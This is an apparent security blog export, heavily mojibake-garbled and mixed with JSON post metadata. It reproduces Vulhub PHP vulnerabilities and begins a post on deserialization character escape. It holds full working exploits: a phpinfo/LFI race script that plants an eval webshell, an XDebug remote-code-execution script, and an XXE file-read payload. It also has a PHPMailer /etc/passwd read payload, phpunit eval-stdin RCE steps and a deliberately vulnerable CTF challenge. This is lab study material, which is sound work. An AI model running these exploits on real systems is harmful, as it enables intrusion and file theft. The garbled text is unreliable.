ä¸ºphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå‘phpinfoé¡µé¢å‘é€åŒ…å«æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…ï¼Œåˆ™å³å¯åœ¨è¿”å›åŒ…é‡Œæ‰¾åˆ°$_FILESå˜é‡çš„å†…å®¹ï¼Œè‡ªç„¶ä¹ŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åã€‚ åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰¾ä¸åˆ°å¯åˆ©ç”¨çš„æ–‡ä»¶æ—¶ï¼Œå³å¯åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶åï¼Œç„¶ååŒ…å«ä¹‹ã€‚ ä½†æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå†å°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ï¼Œè¿›è¡Œgetshellã€‚åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±è¢«åˆ é™¤äº†ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è‡ªç„¶ä¹Ÿå°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚ è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ® å› ä¸ºphpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§ phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ… æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤ åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell æ¼æ´å¤ç°python2 expï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#!/usr/bin/pythonimport sysimport threadingimport socketdef setup(host, port): TAG=&quot;Security Test&quot; PAYLOAD=&quot;&quot;&quot;%s\\r&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;)?&gt;\\r&quot;&quot;&quot; % TAG REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot; % PAYLOAD padding=&quot;A&quot; * 5000 REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r&quot;&quot;&quot; return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = &quot;&quot; while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(&quot;[tmp_name] =&amp;gt; &quot;) fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print &quot;\\nGot it! Shell created in /tmp/g&quot; self.event.set() except socket.error: returndef getOffset(host, port, phpinforeq): &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = &quot;&quot; while True: i = s.recv(4096) d+=i if i == &quot;&quot;: break # detect the final chunk if i.endswith(&quot;0\\r\\n\\r\\n&quot;): break s.close() i = d.find(&quot;[tmp_name] =&amp;gt; &quot;) if i == -1: raise ValueError(&quot;No php tmp_name in phpinfo output&quot;) print &quot;found %s at %i&quot; % (d[i:i+10],i) # padded up a bit return i+256def main(): print &quot;LFI With PHPInfo()&quot; print &quot;-=&quot; * 30 if len(sys.argv) &lt; 2: print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print &quot;Error with port %d: %s&quot; % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e) sys.exit(1) print &quot;Getting initial offset...&quot;, reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print &quot;Spawning worker pool (%d)...&quot; % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( &quot;\\r% 4d / % 4d&quot; % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print &quot;Woot! \\m/&quot; else: print &quot;:(&quot; except KeyboardInterrupt: print &quot;\\nTelling threads to shutdown...&quot; e.set() print &quot;Shuttin&#x27; down...&quot; for t in tp: t.join()if __name__==&quot;__main__&quot;: main() Vulhubä¸Šçš„ç¯å¢ƒæœ‰ä¸¤ä¸ªphpé¡µé¢ 12phpinfo.phplfi.php XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´æ¼æ´ç®€ä»‹è¯¥æ¼æ´ä¸»è¦å±å®³ï¼šä»»æ„æ–‡ä»¶è¯»å–ï¼Œssrf libxml2.9.0ä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´XXEæ¼æ´é€æ¸æ¶ˆäº¡ã€‚ æ¼æ´å¤ç°ç½‘ç«™ç›®å½•ç»“æ„ï¼š 1SimpleXMLElement.php dom.php index.php simplexml_load_string.php simplexml_load_string.phpï¼š 1234&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = simplexml_load_string($data);echo $xml-&gt;name; SimpleXMLElement.phpï¼š 1234&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = new SimpleXMLElement($data);echo $xml-&gt;name; dom.php: 12345&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom); æˆ‘ä»¬å¯ä»¥æ„é€ è¯»å–æ–‡ä»¶ï¼š 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; XDebugè¿œç¨‹è°ƒè¯•æ¼æ´æ¼æ´ç®€ä»‹è¯¥æ¼æ´å¯å¯¼è‡´ä»£ç æ‰§è¡Œã€‚ XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®remote_connect_back = 1ï¼Œå³å¦‚ä¸‹é…ç½®ï¼š 12xdebug.remote_connect_back &#x3D; 1xdebug.remote_enable &#x3D; 1 è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®http://target/index.php?XDEBUG_SESSION_START=phpstormï¼Œç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–X-Forwarded-Forå¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚ æ¼æ´å¤ç°å› ä¸ºéœ€è¦ä½¿ç”¨dbgpåè®®ä¸ç›®æ ‡æœåŠ¡å™¨é€šä¿¡ï¼Œæ‰€ä»¥æ— æ³•ç”¨httpåè®®å¤ç°æ¼æ´ python3 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciifrom concurrent.futures import ThreadPoolExecutorpool = ThreadPoolExecutor(1)session = requests.session()session.headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;&#125;def recv_xml(sock): blocks = [] data = b&#x27;&#x27; while True: try: data = data + sock.recv(1024) except socket.error as e: break if not data: break while data: eop = data.find(b&#x27;\\x00&#x27;) if eop &lt; 0: break blocks.append(data[:eop]) data = data[eop+1:] if len(blocks) &gt;= 4: break return blocks[3]def trigger(url): time.sleep(2) try: session.get(url + &#x27;?XDEBUG_SESSION_START=phpstorm&#x27;, timeout=0.1) except: passif __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;XDebug remote debug code execution.&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, required=True, help=&#x27;the code you want to execute.&#x27;) parser.add_argument(&#x27;-t&#x27;, &#x27;--target&#x27;, required=True, help=&#x27;target url.&#x27;) parser.add_argument(&#x27;-l&#x27;, &#x27;--listen&#x27;, default=9000, type=int, help=&#x27;local port&#x27;) args = parser.parse_args() ip_port = (&#x27;0.0.0.0&#x27;, args.listen) sk = socket.socket() sk.settimeout(10) sk.bind(ip_port) sk.listen(5) pool.submit(trigger, args.target) conn, addr = sk.accept() conn.sendall(b&#x27;&#x27;.join([b&#x27;eval -i 1 -- &#x27;, base64.b64encode(args.code.encode()), b&#x27;\\x00&#x27;])) data = recv_xml(conn) print(&#x27;[+] Recieve data: &#x27; + data.decode()) g = re.search(rb&#x27;&lt;\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]&gt;&#x27;, data, re.I) if not g: print(&#x27;[-] No result...&#x27;) sys.exit(0) data = g.group(1) try: print(&#x27;[+] Result: &#x27; + base64.b64decode(data).decode()) except binascii.Error: print(&#x27;[-] May be not string result...&#x27;) æ³¨æ„ï¼šå› ä¸ºè¯¥é€šä¿¡æ˜¯ä¸€ä¸ªåå‘è¿æ¥çš„è¿‡ç¨‹ï¼Œexp.pyå¯åŠ¨åå…¶å®æ˜¯ä¼šç›‘å¬æœ¬åœ°çš„9000ç«¯å£ï¼ˆå¯é€šè¿‡-lå‚æ•°æŒ‡å®šï¼‰å¹¶ç­‰å¾…XDebugå‰æ¥è¿æ¥ï¼Œæ‰€ä»¥æ‰§è¡Œè¯¥è„šæœ¬çš„æœåŠ¡å™¨å¿…é¡»æœ‰å¤–ç½‘IPï¼ˆæˆ–è€…ä¸ç›®æ ‡æœåŠ¡å™¨å¤„äºåŒä¸€å†…ç½‘ï¼‰ CVE-2017-5223æ¼æ´ç®€ä»‹è¯¥æ¼æ´å¯å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚ PHPMaileræ˜¯å ªç§°å…¨çƒæœ€æµè¡Œé‚®ä»¶å‘é€ç±»ï¼Œå…¶å…¨çƒèŒƒå›´å†…çš„ç”¨æˆ·é‡å¤§çº¦æœ‰900ä¸‡ï¼Œè¢«è¯¸å¤šå¼€æºé¡¹ç›®æ‰€é‡‡ç”¨ï¼ŒåŒ…æ‹¬WordPressã€Drupalã€1CRMã€Joomla!ç­‰ PHPMaileråœ¨å‘é€é‚®ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œä¼šåœ¨é‚®ä»¶å†…å®¹ä¸­å¯»æ‰¾å›¾ç‰‡æ ‡ç­¾ï¼ˆ&lt;img src=&quot;...&quot;&gt;ï¼‰ï¼Œå¹¶å°†å…¶srcå±æ€§çš„å€¼æå–å‡ºæ¥ä½œä¸ºé™„ä»¶ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶éƒ¨åˆ†é‚®ä»¶å†…å®¹ï¼Œå¯ä»¥åˆ©ç”¨&lt;img src=&quot;/etc/passwd&quot;&gt;å°†æ–‡ä»¶/etc/passwdä½œä¸ºé™„ä»¶è¯»å–å‡ºæ¥ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚ æ¼æ´å¤ç°æ­å»ºå¥½ç¯å¢ƒæˆ‘ä»¬çœ‹ä¸‹æºç ï¼š index.php: 1234567891011121314151617181920212223242526272829303132&lt;?phprequire &#39;vendor&#x2F;autoload.php&#39;;if (isset($_POST[&#39;your-name&#39;], $_POST[&#39;your-email&#39;], $_POST[&#39;your-message&#39;])) &#123; $mail &#x3D; new PHPMailer(); $mail-&gt;isSMTP(); $mail-&gt;Host &#x3D; $_ENV[&#39;SMTP_SERVER&#39;]; $mail-&gt;SMTPAuth &#x3D; true; $mail-&gt;Username &#x3D; $_ENV[&#39;SMTP_EMAIL&#39;]; $mail-&gt;Password &#x3D; $_ENV[&#39;SMTP_PASSWORD&#39;]; $mail-&gt;Port &#x3D; intval($_ENV[&#39;SMTP_PORT&#39;]); $mail-&gt;CharSet &#x3D; &#39;UTF-8&#39;; if (in_array($_ENV[&#39;SMTP_SECURE&#39;], [&#39;tls&#39;, &#39;ssl&#39;])) &#123; $mail-&gt;SMTPSecure &#x3D; $_ENV[&#39;SMTP_SECURE&#39;]; &#125; else &#123; $mail-&gt;SMTPSecure &#x3D; false; &#125; $message &#x3D; &lt;&lt;&lt;DATA&lt;p&gt;&lt;strong&gt;&#123;$_POST[&#39;your-name&#39;]&#125;&lt;&#x2F;strong&gt;æ‚¨å¥½ï¼Œæ‚¨åé¦ˆçš„æ„è§å¦‚ä¸‹ï¼š&lt;&#x2F;p&gt;&lt;blackquote&gt;&#123;$_POST[&#39;your-message&#39;]&#125;&lt;&#x2F;blockquote&gt;&lt;p&gt;æˆ‘ä»¬å°†åœ¨24å°æ—¶å†…ç»™äºˆæ‚¨å›å¤ï¼Œè¯·è€å¿ƒç­‰å¾…ï¼&lt;&#x2F;p&gt;DATA; $mail-&gt;SetFrom($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]); $mail-&gt;AddAddress($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]); $mail-&gt;Subject &#x3D; &quot;æ‚¨åé¦ˆçš„æ„è§æˆ‘ä»¬å·²ç»æ”¶åˆ°&quot;; $mail-&gt;MsgHTML($message); if(!$mail-&gt;Send()) echo &quot;Error: &quot;.$mail-&gt;ErrorInfo; else echo &quot;Success!&quot;;&#125;?&gt; PHPMailerç±»åœ¨vendor/phpmailer/phpmailerä¸‹é¢ ç”±äºè‡ªå·±çš„æ˜¯é˜¿é‡Œäº‘ï¼Œå¥½åƒæ­ä¸äº†é‚®ä»¶æœåŠ¡å™¨ï¼Œä¹Ÿæ²¡å¤ç°æˆåŠŸ2333â€¦ æ­å»ºå¥½çš„ç¯å¢ƒå¦‚å›¾ï¼š â€œæ„è§åé¦ˆâ€é¡µé¢ï¼Œæ­£å¸¸ç”¨æˆ·å¡«å†™æ˜µç§°ã€é‚®ç®±ã€æ„è§æäº¤ï¼Œè¿™äº›ä¿¡æ¯å°†è¢«åç«¯å‚¨å­˜ï¼ŒåŒæ—¶åç«¯ä¼šå‘é€ä¸€å°é‚®ä»¶æç¤ºç”¨æˆ·æ„è§å¡«å†™å®Œæˆã€‚è¯¥åœºæ™¯åœ¨å®æˆ˜ä¸­å¾ˆå¸¸è§ï¼Œæ¯”å¦‚ç”¨æˆ·æ³¨å†Œç½‘ç«™æˆåŠŸåï¼Œé€šå¸¸ä¼šæ”¶åˆ°ä¸€å°åŒ…å«è‡ªå·±æ˜µç§°çš„é€šçŸ¥é‚®ä»¶ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬åœ¨æ˜µç§°ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å°†ä»¥é™„ä»¶çš„å½¢å¼è¢«è¯»å–å‡ºæ¥ã€‚ 1&lt;img src=&quot;/etc/passwd&quot;&gt; CVE-2017-9841æ¼æ´ç®€ä»‹è¯¥æ¼æ´å¯å¯¼è‡´ä»£ç æ‰§è¡Œã€‚ composeræ˜¯phpåŒ…ç®¡ç†å·¥å…·ï¼Œä½¿ç”¨composerå®‰è£…æ‰©å±•åŒ…å°†ä¼šåœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ªvendoræ–‡ä»¶å¤¹ï¼Œå¹¶å°†æ‰€æœ‰æ–‡ä»¶æ”¾åœ¨å…¶ä¸­ã€‚é€šå¸¸è¿™ä¸ªç›®å½•éœ€è¦æ”¾åœ¨webç›®å½•å¤–ï¼Œä½¿ç”¨æˆ·ä¸èƒ½ç›´æ¥è®¿é—®ã€‚ phpunitæ˜¯phpä¸­çš„å•å…ƒæµ‹è¯•å·¥å…·ï¼Œå…¶4.8.19 ~ 4.8.27å’Œ5.0.10 ~ 5.6.2ç‰ˆæœ¬çš„vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.phpæ–‡ä»¶æœ‰å¦‚ä¸‹ä»£ç ï¼š 1eval(&#x27;?&gt;&#x27;.file_get_contents(&#x27;php://input&#x27;)); å¦‚æœè¯¥æ–‡ä»¶è¢«ç”¨æˆ·ç›´æ¥è®¿é—®åˆ°ï¼Œå°†é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ¼æ´å¤ç°ç›´æ¥å°†PHPä»£ç ä½œä¸ºPOST Bodyå‘é€ç»™ 1http://yourip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","categories":[],"tags":[{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.m00nback.xyz/tags/Vulhub/"},{"name":"CVE","slug":"CVE","permalink":"http://www.m00nback.xyz/tags/CVE/"}]},{"title":"PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸","slug":"ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸","date":"2020-04-25T07:40:03.000Z","updated":"2020-04-26T15:05:31.856Z","comments":true,"path":"2020/04/25/ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸/","link":"","permalink":"http://www.m00nback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„ç›¸å…³å†…å®¹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„ç›¸å…³å†…å®¹ï¼ ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Ÿä¸ªäººç†è§£ï¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œå­˜åœ¨å¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ›¿æ¢ç­‰æ“ä½œï¼Œå¯¼è‡´å¯ä»¥æ„é€ ç‰¹å®šçš„å­—ç¬¦ä¸²åºåˆ—è¾¾åˆ°æœ¬æ¥å®Œæˆä¸äº†çš„æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹å…¶ä»–å˜é‡çš„å€¼ï¼Œæ³¨å…¥å¯¹è±¡ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š 123456789101112131415&lt;?phpinclude &#x27;flag.php&#x27;;function filter($string)&#123; return str_replace(&#x27;x&#x27;,&#x27;yy&#x27;,$string);&#125;$username = $_GET[&#x27;u&#x27;];$password = &quot;aaa&quot;;$user = array($username, $password);$s = serialize($user);$r = filter($s);$a= unserialize($r);if($a[1]===&#x27;admin&#x27;)&#123; echo $flag;&#125;highlight_file(__FILE__); æœ‰ä¸Šé¢ä¸€æ®µä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯æ§çš„åœ°æ–¹åªæœ‰$usernameï¼Œåé¢æœ‰ä¸€ä¸ªfilterå‡½æ•°æ›¿æ¢ æˆ‘ä»¬çŸ¥é“ï¼ŒPHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ &#125; ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ æ­£å¸¸çš„åºåˆ—åŒ–ç»“æœæ˜¯è¿™æ ·çš„(å‡è®¾u=admin): 1a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:3:&quot;aaa&quot;;&#125; æ­¤æ—¶æ˜¯æ²¡æœ‰xçš„ï¼Œå‡è®¾æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå¸¦å­—æ¯xçš„(u=testx)ï¼Œåºåˆ—åŒ–ç»è¿‡æ›¿æ¢å°±ä¼šå˜æˆ 1a:2:&#123;i:0;s:5:&quot;testyy&quot;;i:1;s:3:&quot;aaa&quot;;&#125; æ­¤æ—¶ååºåˆ—åŒ–ï¼Œå°±ä¼šå¤±è´¥ï¼Œtestyyçš„é•¿åº¦ä¸æ˜¯5è€Œæ˜¯6ï¼Œunserializeå‡½æ•°è¿”å›false ä½†æ˜¯ï¼Œå‡å¦‚æˆ‘ä»¬ä¼ å…¥ï¼Œé•¿åº¦ä¸º38 1/?u=xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125; æ­¤æ—¶åºåˆ—åŒ–ç»“æœæ˜¯ï¼š 1a:2:&#123;i:0;s:38:&quot;xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:3:&quot;aaa&quot;;&#125; ç»è¿‡æ›¿æ¢ååºåˆ—åŒ–ç»“æœï¼š 1a:2:&#123;i:0;s:38:&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:3:&quot;aaa&quot;;&#125; æ­¤æ—¶yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyçš„é•¿åº¦åˆšå¥½ä¸º38ï¼Œå†åŠ ä¸Šåé¢çš„;i:1;s:5:&quot;admin&quot;;&#125;æˆåŠŸååºåˆ—åŒ–ï¼Œè€Œè¿™åé¢çš„ç›´æ¥å¿½ç•¥äº† é‚£æ€æ ·ç®—åˆ°åº•æœ‰å¤šå°‘ä¸ªxå‘¢ï¼Ÿæˆ‘ç”¨çš„æ–¹æ³•æ˜¯åˆ—æ–¹ç¨‹ğŸ˜‚ é¦–å…ˆæˆ‘ä»¬è¦ç¡®å®šéœ€è¦æ·»åŠ çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯åé¢ä¸€ä¸²ï¼Œå³&quot;;i:1;s:5:&quot;admin&quot;;&#125;ï¼Œé•¿åº¦ä¸º19(è®¾ä¸ºm)ï¼Œæ»¡è¶³ä»¥ä¸‹å¼å­(è®¾æœ‰nä¸ªxå­—ç¬¦ï¼Œ&quot;;i:1;s:5:&quot;admin&quot;;&#125;å‰é¢æœ‰yä¸ªéxå­—ç¬¦)ï¼š 1n+y+m=2n+y // åŸæ¥å­—ç¬¦ä¸²çš„é•¿åº¦ = æ›¿æ¢åå»æ‰mçš„é•¿åº¦ è§£æ–¹ç¨‹å¾—n=19ï¼Œå³æˆ‘ä»¬è¦æœ‰19ä¸ªxï¼Œyéšæ„ï¼Œä»ç­‰å¼å¯ä»¥çœ‹å‡ºæŠµæ¶ˆäº† å¦‚æœç¢°åˆ°é™¤ä¸å°½çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥åœ¨&quot;;i:1;s:5:&quot;admin&quot;;&#125;å‰é¢å¢åŠ ä¸€äº›éxå­—ç¬¦ï¼Œç±»ä¼¼ 1a&quot;;i:1;s:5:&quot;admin&quot;;&#125; æ­¤æ—¶mçš„é•¿åº¦å¤§äº19 CTFé¢˜ç›®2020å®‰æ’å››æœˆæœˆèµ›æºç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpshow_source(&quot;index.php&quot;);function write($data) &#123; return str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $data);&#125;function read($data) &#123; return str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $data);&#125;class A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125;class B&#123; public $b = &#x27;gqy&#x27;; function __destruct()&#123; $c = &#x27;a&#x27;.$this-&gt;b; echo $c; &#125;&#125;class C&#123; public $c; function __toString()&#123; //flag.php echo file_get_contents($this-&gt;c); return &#x27;nice&#x27;; &#125;&#125;$a = new A($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);//çœç•¥äº†å­˜å‚¨åºåˆ—åŒ–æ•°æ®çš„è¿‡ç¨‹,ä¸‹é¢æ˜¯å–å‡ºæ¥å¹¶ååºåˆ—åŒ–çš„æ“ä½œ$e = serialize($a);$c = write($e);$d = read($c);$b = unserialize($d); 